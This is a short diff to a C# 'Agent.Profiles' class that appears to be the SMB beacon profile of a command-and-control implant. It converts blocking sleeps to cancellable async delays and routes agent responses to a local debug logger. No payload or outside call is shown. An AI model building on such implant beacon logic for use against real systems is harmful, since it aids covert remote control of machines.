@@ -28,7 +28,7 @@ namespace Agent.Profiles
 
         public async Task<CheckinResponse> Checkin(Checkin checkin)
         {
-            Thread.Sleep(5000);
+            await Task.Delay(5000, cancellationTokenSource.Token);
 
             return new CheckinResponse()
             {
@@ -44,7 +44,9 @@ namespace Agent.Profiles
         {
             while (!cancellationTokenSource.Token.IsCancellationRequested)
             {
-                var taskResponses = messageManager.GetAgentResponseString();
+                await messageManager.DeliverAsync(
+                    DeliverToDebugSink,
+                    delivered => delivered);
 
                 string fileGuid = Guid.NewGuid().ToString();
                 Dictionary<string, string> smbParams = new Dictionary<string, string>()
@@ -75,8 +77,21 @@ namespace Agent.Profiles
                     SetTaskingReceived(this, tra);
                 }
 
-                Thread.Sleep(Misc.GetSleep(agentConfig.sleep, agentConfig.jitter)*1000);
+                try
+                {
+                    await Task.Delay(Misc.GetSleep(agentConfig.sleep, agentConfig.jitter) * 1000, cancellationTokenSource.Token);
+                }
+                catch (OperationCanceledException) when (cancellationTokenSource.IsCancellationRequested)
+                {
+                    break;
+                }
             }
+        }
+
+        private Task<bool> DeliverToDebugSink(string message)
+        {
+            logger.Log(message);
+            return Task.FromResult(true);
         }
 
         public bool StopBeacon()
